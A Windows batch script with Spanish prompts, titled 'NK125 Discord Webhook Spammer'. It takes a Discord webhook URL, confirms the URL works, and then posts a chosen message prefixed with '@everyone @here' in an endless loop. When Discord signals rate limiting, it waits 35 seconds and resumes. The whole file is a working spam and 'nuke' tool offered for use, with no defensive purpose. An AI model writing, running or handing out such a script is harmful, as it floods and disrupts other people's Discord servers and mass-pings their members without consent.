@echo off
:main
setlocal enableextensions
break off
cls
echo =====================
echo ^|   NK125 Discord   ^|
echo ^|  Webhook Spammer  ^|
echo =====================
echo.
:enter
echo.
set /p "webhook=Ingresa el webhook a nukear: "
echo %webhook% | findstr /I /C:""">webhook
if exist webhook (
      del webhook /f /s /q
      cls
      goto main
)
if "%webhook%"=="" goto enter
echo.
echo Haciendo un request para comprobar el webhook. . .
call winhttpjs.bat %webhook% -saveTo response.txt | findstr /I /C:"Status: 200"
echo.
if %errorlevel% NEQ 0 (
	echo Webhook Invalido
	goto enter
)
for /f "tokens=6 delims=:," %%a in (response.txt) do (
	echo El webhook detectado es el siguiente:
	echo %%a
)
:enter0
echo.
set /p "enter=Desea nukear el webhook? (S,N): "
echo %enter% | findstr /I /C:""">enter
if exist enter (
      del enter /f /s /q
      goto enter0
)
if "%enter%"=="" goto enter0
if /I "%enter%"=="N" (
	cls
	goto main
) else if /I "%enter%" NEQ "S" goto enter0
:enter1
echo.
set /p "msg=Ingresa el mensaje que quieras spamear en el webhook: "
echo %msg% | findstr /I /C:""">msg
if exist msg (
      del msg /f /s /q
      goto enter1
)
if "%msg%"=="" goto enter1
set "webmsg=@everyone @here %msg%"
set webspam=0
echo Content-Type:application/json>head
echo {"content": "%webmsg%"}>body
:webspam
set /a webspam+=1
echo.
echo Spam en proceso ^(%webspam%^). . .
call winhttpjs.bat %webhook% -method POST -saveTo response -headers-file head -body-file body -force yes | findstr /I /C:"Status:">status
for /f "tokens=2" %%a in (status) do set "return=%%a"
del status /f /s /q 1>nul 2>nul
if "%return%" NEQ "204" (
	echo Un error ha ocurrido mientras se enviaba el mensaje, respuesta http: %return%
	echo Si el error es conocido, algun mensaje aparecera abajo.
	set /a webspam-=1
)
echo.
if "%return%"=="404" (
	echo La ID del webhook no es correcta o ya no existe
	pause
	goto main
)
if "%return%"=="401" (
	echo El token del webhook no es correcto o ya no existe
	pause
	goto main
)
if "%return%"=="429" (
    echo Se han generado muchas request, esperando 35 segundos para continuar. . .
	echo ^(Es el limite por defecto de discord^)
    ping localhost -n 35 1>nul 2>nul
)
goto webspam
